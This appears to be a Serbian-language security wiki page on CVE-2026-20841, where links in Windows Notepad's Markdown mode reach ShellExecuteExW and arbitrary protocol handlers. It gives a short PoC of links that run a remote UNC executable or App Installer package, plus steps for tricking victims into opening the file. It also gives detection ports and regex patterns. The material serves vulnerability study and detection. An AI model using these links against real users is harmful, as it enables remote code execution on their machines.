# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Moderne Windows aplikacije koje renderuju Markdown/HTML često pretvaraju linkove koje korisnik dostavi u klikabilne elemente i prosleđuju ih funkciji `ShellExecuteExW`. Bez stroge liste dozvoljenih šema, bilo koji registrovani protocol handler (npr. `file:`, `ms-appinstaller:`) može biti pokrenut, što može dovesti do izvršavanja koda u kontekstu trenutnog korisnika.

## Napadna površina ShellExecuteExW u Windows Notepad Markdown režimu
- Notepad bira Markdown režim **samo za `.md` ekstenzije** putem fiksnog string upoređivanja u `sub_1400ED5D0()`.
- Podržani Markdown linkovi:
- Standard: `[text](target)`
- Autolink: `<target>` (renderovano kao `[target](target)`), tako da obe sintakse utiču na payloads i detekcije.
- Klikovi na linkove se obrađuju u `sub_140170F60()`, koja obavlja slabo filtriranje i zatim poziva `ShellExecuteExW`.
- `ShellExecuteExW` prosleđuje poziv na **bilo koji konfigurisani protocol handler**, a ne samo HTTP(S).

### Razmatranja vezana za payload
- Sve `\\` sekvence u linku se **normalizuju u `\`** pre poziva `ShellExecuteExW`, što utiče na kreiranje UNC/putanja i detekciju.
- Fajlovi `.md` **nisu podrazumevano povezani sa Notepad-om**; žrtva mora otvoriti fajl u Notepad-u i kliknuti na link, ali kada se renderuje, link je klikabilan.
- Primeri opasnih šema:
- `file://` za pokretanje lokalnog/UNC payload-a.
- `ms-appinstaller://` za pokretanje App Installer flow-ova. Druge lokalno registrovane šeme takođe mogu biti zloupotrebljene.

### Minimalni PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Tok eksploatacije
1. Napravite **`.md` file** tako da Notepad renderuje kao Markdown.
2. Umetnite link koji koristi opasnu URI šemu (`file:`, `ms-appinstaller:`, ili bilo koji instalirani handler).
3. Dostavite fajl (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB ili slično) i ubedite korisnika da ga otvori u Notepad.
4. Na klik, normalizovani link se prosleđuje `ShellExecuteExW` i odgovarajući protocol handler izvršava referencirani sadržaj u kontekstu korisnika.

## Ideje za detekciju
- Pratite transfer `.md` fajlova preko portova/protokola koji obično prenose dokumente: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsirajte Markdown linkove (standardne i autolink) i tražite **neosetljivo na velika/mala slova** `file:` ili `ms-appinstaller:`.
- Regex-e koje su preporučili vendor-i za hvatanje pristupa udaljenim resursima:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Prema izveštajima, ponašanje zakrpe navodno **dodaje na listu dozvoljenih lokalne fajlove i HTTP(S)**; sve drugo što dosegne `ShellExecuteExW` je sumnjivo. Proširite detekcije na druge instalirane protocol handlers po potrebi, jer attack surface varira po sistemu.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
